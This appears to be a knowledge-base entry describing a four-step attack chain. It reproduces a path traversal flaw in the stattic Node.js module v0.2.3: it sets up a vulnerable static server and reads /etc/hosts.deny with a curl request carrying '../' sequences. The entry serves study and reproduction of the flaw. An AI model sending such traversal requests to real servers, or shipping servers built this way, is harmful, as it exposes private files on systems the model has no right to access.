---
tags:
  - path-traversal
  - node-js
  - file-read
  - vulnerability
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Vulnerable-Stattic-Module]]'
  - '[[procedures/Setup-Vulnerable-Static-Server]]'
  - '[[procedures/Run-Vulnerable-Node-Server]]'
  - '[[procedures/Exploit-Path-Traversal-with-Curl]]'
step_count: 4
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:16.625Z'
description: >-
  Demonstrates exploitation of a path traversal vulnerability in the stattic
  Node.js module (v0.2.3) to access and read arbitrary files outside the served
  directory, such as system files.
skill_level: intermediate
impact_level: high
id: 7da79214-4eb1-42c3-a434-15afdf56bb4a
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Path Traversal in Stattic Node.js Module to Read Arbitrary Server Files

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in the 'stattic' Node.js module version 0.2.3, allowing unauthorized access to files outside the configured root directory via crafted HTTP requests.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Module] --> B[Setup Server]
    B --> C[Run Server]
    C --> D[Exploit Traversal]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/curl]]

### Target Environment

- Node.js runtime installed
- Linux/Unix-like OS for testing system files like /etc/hosts.deny
- Local network access to port 8080

### Initial Access Requirements

- No credentials needed; assumes local or remote access to a server running the vulnerable module
- Ability to install Node.js packages

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module

procedure: [[procedures/Install-Vulnerable-Stattic-Module]]

**Objective**: Install the vulnerable stattic module version 0.2.3 to set up the exploitation environment.

**Instructions**: Use [[commands/npm-install-stattic]] to fetch the module from the npm registry.

```bash
npm install stattic
```

**Expected Output**: Installation logs showing successful download and creation of node_modules directory with stattic@0.2.3.

**Success Indicators**:
- node_modules/stattic directory exists
- package.json updated with dependency

### Step 2: Setup Vulnerable Static Server

procedure: [[procedures/Setup-Vulnerable-Static-Server]]

**Objective**: Create a sample Node.js application that uses the vulnerable module to serve static files from the current directory.

**Instructions**: Manually write app.js with the following content:

```javascript
const stattic = require('stattic');
const server = stattic({
  folder: './',
  port: 8080
});
server.listen(8080, () => {
  console.log('Server running on port 8080');
});
```

Save the file as app.js in your project directory.

**Expected Output**: app.js file created with the server configuration.

**Success Indicators**:
- app.js file exists and imports stattic correctly
- No syntax errors on initial parse

### Step 3: Run Vulnerable Node Server

procedure: [[procedures/Run-Vulnerable-Node-Server]]

**Objective**: Start the HTTP server to expose the path traversal vulnerability.

**Instructions**: Execute [[commands/node-run-app]] to launch the server.

```bash
node app.js
```

**Expected Output**: Console output indicating "Server running on port 8080".

**Success Indicators**:
- Server listening on localhost:8080
- No errors in console

### Step 4: Exploit Path Traversal

procedure: [[procedures/Exploit-Path-Traversal-with-Curl]]

**Objective**: Craft an HTTP request to traverse directories and read a sensitive system file like /etc/hosts.deny.

**Instructions**: Use [[commands/curl-path-traversal-exploit]] to send a GET request with traversal sequences.

```bash
curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny
```

**Expected Output**: HTTP 200 response body containing the contents of /etc/hosts.deny, such as denied host IP lists.

**Success Indicators**:
- File contents returned in response
- No 404 or access denied error

## Attack Chain Summary

### Key Achievements

1. Successful installation and setup of vulnerable module
2. Launch of exploitable static file server
3. Unauthorized reading of arbitrary server files via path traversal
4. Exposure of sensitive system information

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]] File and Directory Discovery
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
